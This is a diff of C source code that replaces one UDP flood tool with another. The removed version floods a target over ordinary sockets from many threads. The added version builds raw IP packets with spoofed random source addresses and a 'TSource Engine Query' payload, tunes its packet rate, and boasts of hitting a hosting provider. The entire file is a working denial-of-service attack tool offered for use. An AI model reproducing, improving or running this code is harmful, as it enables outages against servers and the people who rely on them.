@@ -1,145 +1,181 @@
+/*
+        Fatti made this method hit nfos no cap
+*/
+ 
+#include <pthread.h>
+#include <unistd.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/socket.h>
-#include <arpa/inet.h>
-#include <pthread.h>
-#include <unistd.h>
-#include <signal.h>
-#include <time.h>
-
-// Define expiration date
-#define EXPIRATION_YEAR 2027
-#define EXPIRATION_MONTH 12 // October
-#define EXPIRATION_DAY 2   // 31st
-
-// Structure to store attack parameters
-typedef struct {
-    char *target_ip;
-    int target_port;
-    int duration;
-    int packet_size;
-    int thread_id;
-} attack_params;
-
-volatile int keep_running = 1;
-
-// Signal handler to stop the attack
-void handle_signal(int signal) {
-    keep_running = 0;
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+ 
+#define MAX_PACKET_SIZE 4096
+#define PHI 0x9e3779b9
+ 
+static unsigned long int Q[4096], c = 362436;
+static unsigned int floodport;
+volatile int limiter;
+volatile unsigned int pps;
+volatile unsigned int sleeptime = 100;
+ 
+void init_rand(unsigned long int x)
+{
+        int i;
+        Q[0] = x;
+        Q[1] = x + PHI;
+        Q[2] = x + PHI + PHI;
+        for (i = 3; i < 4096; i++){ Q[i] = Q[i] ^ Q[i] ^ PHI ^ i; }
 }
-
-// Function to generate a random hexadecimal payload
-void generate_random_payload(char *payload, int size) {
-    for (int i = 0; i < size; i++) {
-        // Generate a random byte and store it in the payload in hexadecimal format
-        payload[i] = (rand() % 256);  // Random byte between 0 and 255
-    }
+unsigned long int rand_cmwc(void)
+{
+        unsigned long long int t, a = 18782LL;
+        static unsigned long int i = 4095;
+        unsigned long int x, r = 0xfffffffe;
+        i = (i + 1) & 4095;
+        t = a * Q[i] + c;
+        c = (t >> 32);
+        x = t + c;
+        if (x < c) {
+                x++;
+                c++;
+        }
+        return (Q[i] = r - x);
 }
-
-// Function to perform the UDP flooding
-void *udp_flood(void *arg) {
-    attack_params *params = (attack_params *)arg;
-    int sock;
-    struct sockaddr_in server_addr;
-    char *message;
-
-    // Create a UDP socket
-    sock = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sock < 0) {
-        perror("Socket creation failed");
-        return NULL;
-    }
-
-    // Set up server address structure
-    memset(&server_addr, 0, sizeof(server_addr));
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(params->target_port);
-    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);
-
-    // Allocate message for flooding
-    message = (char *)malloc(params->packet_size);
-    if (message == NULL) {
-        perror("Memory allocation failed");
-        return NULL;
-    }
-
-    // Generate random payload
-    generate_random_payload(message, params->packet_size);
-
-    // Time-bound attack loop
-    time_t end_time = time(NULL) + params->duration;
-    while (time(NULL) < end_time && keep_running) {
-        sendto(sock, message, params->packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
-    }
-
-    free(message);
-    close(sock);
-    return NULL;
+unsigned short csum (unsigned short *buf, int count)
+{
+        register unsigned long sum = 0;
+        while( count > 1 ) { sum += *buf++; count -= 2; }
+        if(count > 0) { sum += *(unsigned char *)buf; }
+        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
+        return (unsigned short)(~sum);
 }
+ 
+void setup_ip_header(struct iphdr *iph)
+{
+    char ip[17];
+    snprintf(ip, sizeof(ip)-1, "%d.%d.%d.%d", rand()%255, rand()%255, rand()%255, rand()%255);
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 50;
+    iph->id = htonl(rand()%65535);
+    iph->frag_off = 0;
+    iph->ttl = MAXTTL;
+    iph->protocol = 17;
+    iph->check = 0;
+    iph->saddr = inet_addr(ip);
+}
+ 
+void setup_udp_header(struct udphdr *udph)
+{
+    udph->source = htons(rand()%65535);
+    udph->dest = htons(floodport);
+    udph->check = 0;
+    void *data = (void *)udph + sizeof(struct udphdr);
+    memset(data, 0xFF, 4);
+    strcpy(data+4, "TSource Engine Query");
+    udph->len=htons(sizeof(struct udphdr) + 50);
+}
+ 
+void *flood(void *par1)
+{
+        //int class[]= {16843009, 134744072, 151587081, 2155093072, 2155093012, 2450767831, 1348198214,37384646,764308322,3247258861,763588419,755884866,755884954,3111453514,37384655,764308428,100529771};
+        char *td = (char *)par1;
+        char datagram[MAX_PACKET_SIZE];
+        struct iphdr *iph = (struct iphdr *)datagram;
+        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
+       
+        struct sockaddr_in sin;
+        sin.sin_family = AF_INET;
+        sin.sin_port = htons(floodport);
 
-int main(int argc, char *argv[]) {
-    // Get the current time
-    time_t now;
-    time(&now);
-
-    // Convert to local time
-    struct tm *local = localtime(&now);
-
-    // Check if the current date is past the expiration date
-    if (local->tm_year + 1900 > EXPIRATION_YEAR ||
-        (local->tm_year + 1900 == EXPIRATION_YEAR && local->tm_mon + 1 > EXPIRATION_MONTH) ||
-        (local->tm_year + 1900 == EXPIRATION_YEAR && local->tm_mon + 1 == EXPIRATION_MONTH && local->tm_mday > EXPIRATION_DAY)) {
-        
-        printf("Chud Gya HAi.\n");
-        return EXIT_FAILURE;
-    }
-
-    printf("Chal Raha HAi\n");
-
-    // Check for correct arguments
-    if (argc != 6) {
-        printf("Usage: %s [IP] [PORT] [TIME] [THREAD_COUNT]\n", argv[0]);
-        return -1;
-    }
-
-    // Parse input arguments
-    char *target_ip = argv[1];
-    int target_port = atoi(argv[2]);
-    int duration = atoi(argv[3]);
-    int packet_size = atoi(argv[4]);
-    int thread_count = atoi(argv[5]);
-
-    // Validate the input
-    if (packet_size <= 0 || thread_count <= 0) {
-        printf("Invalid packet size or thread count.\n");
-        return -1;
-    }
-
-    // Setup signal handler to allow clean exit
-    signal(SIGINT, handle_signal);
-
-    // Array of thread IDs
-    pthread_t threads[thread_count];
-    attack_params params[thread_count];
-
-    // Launch multiple threads for flooding
-    for (int i = 0; i < thread_count; i++) {
-        params[i].target_ip = target_ip;
-        params[i].target_port = target_port;
-        params[i].duration = duration;
-        params[i].packet_size = packet_size;
-        params[i].thread_id = i;
-
-        // Start each thread without printing
-        pthread_create(&threads[i], NULL, udp_flood, &params[i]);
-    }
-
-    // Wait for all threads to finish
-    for (int i = 0; i < thread_count; i++) {
-        pthread_join(threads[i], NULL);
-    }
-
-    printf("Attack finished. All threads stopped.\n");
-    return 0;
+        sin.sin_addr.s_addr = inet_addr(td);
+ 
+        int s = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);
+        if(s < 0){
+                fprintf(stderr, "Could not open raw socket.\n");
+                exit(-1);
+        }
+        memset(datagram, 0, MAX_PACKET_SIZE);
+        setup_ip_header(iph);
+        setup_udp_header(udph);
+ 
+        iph->daddr = sin.sin_addr.s_addr;
+        iph->check = csum ((unsigned short *) datagram, iph->tot_len);
+ 
+        int tmp = 1;
+        const int *val = &tmp;
+        if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
+                fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
+                exit(-1);
+        }
+ 
+        init_rand(time(NULL));
+        register unsigned int i;
+        i = 0;
+        while(1){
+                sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
+                //iph->saddr = htonl(class[rand_cmwc()%20]);
+                iph->saddr = htonl(rand_cmwc() & 0xFFFFFFFF);
+                iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
+                iph->check = csum ((unsigned short *) datagram, iph->tot_len);
+               
+                pps++;
+                if(i >= limiter)
+                {
+                        i = 0;
+                        usleep(sleeptime);
+                }
+                i++;
+        }
+}
+int main(int argc, char *argv[ ])
+{
+        if(argc < 5){
+                fprintf(stderr, "Invalid parameters!\n");
+                fprintf(stdout, "@CKDDOS-Usage: %s <target IP> <Flood Port> <number threads to use> <pps limiter, -1 for no limit> <time>\n", argv[0]);
+                exit(-1);
+        }
+ 
+        fprintf(stdout, "Setting up Sockets...\n");
+        floodport = atoi(argv[2]);
+        int num_threads = atoi(argv[3]);
+        int maxpps = atoi(argv[4]);
+        limiter = 0;
+        pps = 0;
+        pthread_t thread[num_threads];
+       
+        int multiplier = 100;
+ 
+        int i;
+        for(i = 0;i<num_threads;i++){
+                pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
+        }
+        fprintf(stdout, "Starting Flood... Fatti Made This Shit... Sending Fatass Packets\n");
+        for(i = 0;i<(atoi(argv[5])*multiplier);i++)
+        {
+                usleep((1000/multiplier)*1000);
+                if((pps*multiplier) > maxpps)
+                {
+                        if(1 > limiter)
+                        {
+                                sleeptime+=100;
+                        } else {
+                                limiter--;
+                        }
+                } else {
+                        limiter++;
+                        if(sleeptime > 25)
+                        {
+                                sleeptime-=25;
+                        } else {
+                                sleeptime = 0;
+                        }
+                }
+                pps = 0;
+        }
+ 
+        return 0;
 }
